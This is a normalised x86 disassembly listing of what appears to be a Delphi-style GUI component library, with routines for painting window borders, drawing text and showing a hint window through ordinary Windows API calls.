mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_455b45
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45576c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44f91c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_455b84
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4507a0
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_44e21c
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_455bcc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4509c0
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_455bfc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4553b8
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_45194c
xor ecx ecx
push ebp
push sub_455d2b
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_451de4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_451de4
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455d32
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_451954
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_451da8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_455d32
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403518
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403518
jmp r-xdata
sub_455dc8
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44fa80
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44fa80
sub_455e0c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44fa80
sub_455e7c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_455f0c
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_456172
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_425300
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43f31c
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43fa14
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4561b4
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e50
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_44e3f8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_4529a0
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44fa80
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_450c44
sub_456220
push ebx
push esi
mov esi edx
call sub_4657c8
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406de0
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44fa80
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406de0
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44fa80
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_456284
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_452d68
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4562bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4562b4
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4562fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44d9b4
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_44d490
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_456358
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_40331c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44da8c
test bl bl
jle r-xdata
xor eax eax
call sub_44ba84
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_456398
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425720
xor eax eax
push ebp
push sub_456433
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425b4c
xor eax eax
push ebp
push sub_456410
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456417
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_425b4c
retn
sub_456444
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_456d7c
mov edx 0x80ffff
mov eax esi
call sub_44ea54
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_4259ec
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_4253e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4564b0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_451f40
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c5bc
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_451ed8
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_45651c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456572
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456579
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ReleaseDC
retn
sub_456580
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_456619
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_424b00
mov eax ebx
call sub_450bec
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x14 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x208 ]
call sub_425acc
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456620
lea eax [ ebp - 0x14 ]
call sub_404118
retn
sub_456628
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_456694
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_45671f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456726
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44e8b4
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_42592c
mov edx eax
add edx 0x6
mov eax esi
call sub_44e070
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44e8b4
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_425948
mov edx eax
add edx 0x4
mov eax esi
call sub_44e094
sub_45672c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_456905
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44e8e4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44fb24
mov eax [ esi ]
call sub_46c000
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46c00c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46c000
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_46bff4
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_46c00c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_46bfe8
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_46bff4
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_46bfe8
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4527e8
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45690c
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4043d8
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4599c4
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call [ rw-data ]
sub_456914
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45693c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_41766c
mov eax esi
call sub_450bec
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ esi + 0x208 ]
call sub_425acc
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_456998
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_41766c
call sub_43f31c
call sub_43f3fc
test al al
jne r-xdata
call sub_43f31c
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43f688
push esp
push 0x1
push 0xf
push 0x0
call sub_43f31c
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43f46c
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_456a04
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4530f0
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_456a28
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
